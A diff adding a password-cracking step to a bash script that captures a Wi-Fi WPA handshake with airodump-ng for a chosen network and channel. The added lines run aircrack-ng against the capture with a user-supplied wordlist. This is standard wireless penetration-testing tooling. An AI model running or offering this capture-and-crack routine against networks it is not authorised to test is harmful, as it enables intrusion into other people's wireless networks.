@@ -72,3 +72,22 @@ fi
 # Capturing Handshake
 sudo airodump-ng -w "$filename" -c "$c" --bssid "$bssid" "$monitor_interface"
 
+echo -n -e "\033[1;33mDo you need to crack the password? (y/n): \033[0m"
+read flag
+
+if [ "$flag" = 'y' ]; then
+    echo -n -e "\033[1;33mPath to your word list: \033[0m"
+    read wrdlist
+
+    if [ -f "$wrdlist" ]; then
+        aircrack-ng "$filename-01.cap" -c "$c" -w "$wrdlist"
+    
+    else
+        echo "File does not exist."
+        exit
+    fi
+
+else
+    echo "Bye!"
+
+fi
